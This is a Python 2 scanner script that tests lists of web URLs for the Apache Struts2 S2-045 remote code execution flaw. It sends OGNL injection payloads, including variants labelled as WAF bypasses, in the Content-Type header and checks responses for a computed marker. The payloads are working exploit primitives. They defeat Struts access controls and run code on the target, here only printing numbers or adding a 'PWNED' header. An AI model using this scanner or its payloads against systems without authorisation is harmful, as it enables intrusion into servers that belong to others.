#coding: utf-8
#code by Mosuan
import re
import sys
import requests
requests.packages.urllib3.disable_warnings()

payload_dict = {
    "struts2-045-%":{
        "payload":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}",
        "reg":{
            "html":"88866777"
        }
    },
    "struts2-045-$":{
        "payload":"${(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}",
        "reg":{
            "html":"88866777"
        }
    },
    "struts2-045-bypass-waf-$":{
        "payload":'.multipart/form-data~${"#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",88888888-23333)}',
        "reg":{
            "header":"88865555"
        }
    },
    "struts2-045-bypass-waf-%":{
        "payload":'.multipart/form-data~%{"#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",88888888-23333)}',
        "reg":{
            "header":"88865555"
        }
    }
}

def bug_test(url):
    print "***************************** 正在测试 ****************************"
    print url
    print "******************************************************************"
    struts2 = []
    for x in payload_dict:
        payload = payload_dict[x]['payload']
        reg = payload_dict[x]['reg']
        header = {
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Content-Type': payload
        }
        try:
            response = requests.get(url,headers=header,verify=False,allow_redirects=False,timeout=4)
            #判断拿什么来匹配正则
            for x,y in reg.items():
                if x == 'html':
                    result = re.findall(y,response.content)
                elif x == 'header':
                    for x in response.headers:
                        result = re.findall(y,response.headers[x])
                if len(result) != 0:
                    dicts = {
                        "url":url,
                        "payload":payload
                    }
                    print dicts
                    struts2.append(dicts)
        except Exception,e:
            pass
    return struts2

if __name__ == '__main__':
    if sys.argv[1] == '--file':
        bugresult = []
        filename = sys.argv[2]
        filecontent = open(filename)
        try:
            all_the_text = filecontent.readlines()
        finally:
            filecontent.close()


        for x in all_the_text:
            x = x.replace('\r\n','')
            url = 'http://'+x
            check = bug_test(url)
            if len(check) !=0:
                bugresult.append(url)
        print bugresult
    else:
        url =sys.argv[1]
        print bug_test(url)
